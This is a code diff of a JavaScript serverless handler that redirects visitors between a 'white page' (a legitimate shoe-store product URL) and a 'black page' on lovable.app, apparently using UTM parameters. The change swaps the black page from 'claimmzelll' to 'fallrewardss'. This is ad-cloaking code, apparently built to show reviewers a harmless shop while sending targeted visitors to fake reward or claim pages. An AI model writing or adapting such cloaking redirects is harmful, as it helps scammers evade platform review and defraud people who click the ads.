@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://www.khazanay.pk/collections/mens-sports-shoes/products/adidas-supernova-s-380848?variant=42444755370179";
-    const blackPageURL = "https://claimmzelll.lovable.app";
+    const blackPageURL = "https://fallrewardss.lovable.app";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
